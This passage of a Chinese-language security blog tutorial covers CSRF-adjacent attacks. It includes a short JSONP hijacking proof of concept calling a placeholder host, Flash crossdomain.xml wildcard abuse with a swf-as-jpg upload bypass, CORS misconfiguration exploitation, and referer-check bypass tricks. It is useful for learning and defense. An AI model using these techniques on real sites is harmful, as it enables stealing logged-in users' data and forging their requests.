class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">                 var html = '&lt;ul&gt;';</span></span><br><span class="line"><span class="string">            for(var i = 0; i &lt; result.length; i++)</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                html += '&lt;li&gt;' + result[i] + '&lt;/li&gt;';</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            html += '&lt;/ul&gt;';</span></span><br><span class="line"><span class="string">            document.getElementById('divCustomers').innerHTML = html;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script type="</span>text/javascript<span class="string">" src="</span>http:<span class="comment">//39.108.154.166:8002/remote.php?jsoncallback=comical"&gt;&lt;/script&gt;</span></span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这一次我们做了一点小小的处理使得服务器根据传参来处理内容，而客户端则只需要修改参数和函数名即可</p>
+<p><img src="C:/%E6%9C%AA%E5%88%86%E7%B1%BB/samaorigin/4.png" alt=""></p>
+<p>这时候我们可以来构建一下PoC：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 引用一段如上请求为JS --&gt;</span><br><span class="line">&lt;script&gt;<span class="function"><span class="keyword">function</span> <span class="title">jsonp2</span>(<span class="params">data</span>)</span>&#123;alert(<span class="built_in">JSON</span>.stringify(data));&#125;&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src="http:/</span><span class="regexp">/xxx.cn/u</span>ser/center?callback=jsonp2<span class="string">"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样可以成功把内容打印出来</p>
+<p>利用xhr或者外链图片即可把信息发到目标服务器</p>
+<p>bypass jsonp主要是用到置空referer</p>
+<p>可以利用iframe标签和meta标签</p>
+<h4 id="Flash跨域劫持"><a href="#Flash跨域劫持" class="headerlink" title="Flash跨域劫持"></a>Flash跨域劫持</h4><p>flash跨域劫持的本质是可以利用Flash而非JavaScript来控制浏览器向目标URL发送请求，从而实现Flash CSRF攻击。文件内容如果是如下的，那么就存在Flash跨域问题，如下内容的意思是支持所有域:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">cross-domain-policy</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"*"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cross-domain-policy</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们知道，通过Flash请求外部资源时，会先访问外域是否存在crossdomain.xml且判断Flash当前域是否在allow-access-from标签配置的domain内。当domain的值为通配符*时，表明该站资源对所有外域开放，等同于舍弃了Flash层面的同源策略的限制。</p>
+<p>如果目标站点的crossdomain.xml中domain值为*或者其中某些domain下的站可被攻击者利用来上传Flash文件等，那么攻击者可以诱使受害者用户访问攻击页面，进而通过触发Flash请求某个用户当前浏览器已登录的页面，从中提取出CSRF的token或者页面的其他敏感信息，造成CSRF攻击。</p>
+<p>当你找到一个crossdomain.xml你需要做得就是找到一个可获取敏感信息的接口 然后构造poc</p>
+<p>poc地址<a href="https://github.com/nccgroup/CrossSiteContentHijacking/raw/master/ContentHijacking/objects/ContentHijacking.swf" target="_blank" rel="noopener">https://github.com/nccgroup/CrossSiteContentHijacking/raw/master/ContentHijacking/objects/ContentHijacking.swf</a></p>
+<p>bypass crossdomain</p>
+<p>使用object标签嵌入flash文件，而这个并不关心扩展名或者Content-Type，只要是正常的swf内容即可正常运行</p>
+<p>上传swf至某个子域下，保存为图片1.jpg</p>
+<p>用application/x-shockwave-flash的object标签将文件1.jpg嵌入到攻击者服务器中</p>
+<p>国外案例</p>
+<p><a href="https://blog.h3xstream.com/2015/04/crossdomainxml-beware-of-wildcards.html" target="_blank" rel="noopener">https://blog.h3xstream.com/2015/04/crossdomainxml-beware-of-wildcards.html</a></p>
+<h4 id="CORS跨域资源读取"><a href="#CORS跨域资源读取" class="headerlink" title="CORS跨域资源读取"></a>CORS跨域资源读取</h4><p>CORS跨域漏洞的本质是服务器配置不当，即Access-Control-Allow-Origin设置为*或是直接取自请求头Origin字段，Access-Control-Allow-Credentials设置为true。</p>
+<p>利用场景</p>
+<ol>
+<li>加上了请求头 <code>Origin: http://xxx</code>，返回了<code>Access-Control-Allow-Origin: http://xxx</code></li>
+<li>Access-Control-Allow-Origin: *</li>
+<li>找到敏感信息接口</li>
+<li>构造poc</li>
+</ol>
+<p><a href="http://127.0.0.1/CrossSiteContentHijacking/ContentHijackingLoader.html" target="_blank" rel="noopener">http://127.0.0.1/CrossSiteContentHijacking/ContentHijackingLoader.html</a></p>
+<h2 id="0x03-防御"><a href="#0x03-防御" class="headerlink" title="0x03 防御"></a>0x03 防御</h2><ol>
+<li>验证referer</li>
+<li>设置token</li>
+<li>关键操作添加验证码</li>
+</ol>
+<h2 id="0x04-bypass"><a href="#0x04-bypass" class="headerlink" title="0x04 bypass"></a>0x04 bypass</h2><p>正则匹配: shop.com</p>
+<p><a href="https://shop.com" target="_blank" rel="noopener">https://shop.com</a></p>
+<ol>
+<li><p>置空</p>
+</li>
+<li><p>子域名(自己的本地apache绑定域名:改host)</p>
+<p>xxx.shop.com</p>
+<p>shop.com.xxx</p>
+</li>
+<li><p>url<br><a href="https://xxxshop.com" target="_blank" rel="noopener">https://xxxshop.com</a><br><a href="https://xxx.com/shop.com.xxx" target="_blank" rel="noopener">https://xxx.com/shop.com.xxx</a></p>
+</li>
+<li><p>参数<br><a href="https://xxx.com/xxx?xxx=shop.com" target="_blank" rel="noopener">https://xxx.com/xxx?xxx=shop.com</a></p>
+</li>
+<li><p>其他子域名的xss</p>
+</li>
+</ol>
+<h2 id="0x05-tricks"><a href="#0x05-tricks" class="headerlink" title="0x05 tricks"></a>0x05 tricks</h2><ol>
+<li>token一般存在于form表单、</li>
+<li>token经常会失效，不妨删除试试</li>
+</ol>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avater.jpg" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>comical</div>
+      <div>2019-04-28</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/web/">web</a>
+
+      <a class="tag-link" href="/tags/csrf/" rel="tag">#csrf</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
